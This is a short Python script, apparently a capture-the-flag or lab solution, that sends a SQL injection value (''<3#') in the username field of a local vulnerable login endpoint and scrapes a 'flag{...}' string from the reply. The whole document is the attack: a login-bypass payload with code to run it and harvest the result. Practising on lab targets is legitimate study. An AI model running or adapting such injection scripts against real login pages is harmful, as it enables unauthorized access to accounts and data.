import requests
import re

target_url = "http://127.0.0.1:8080/vuln/sqli/login"

payload = {
    "username": "'<3#",
    "password": "1"
}

response = requests.get(target_url, params=payload)

if response.status_code == 200:
    data = response.text
    if "flag" in data:
        match = re.search(r"flag{.*?}", data)
        if match:
            extracted_data = match.group(0)
            print(extracted_data)
else:
    print("SQLi failed")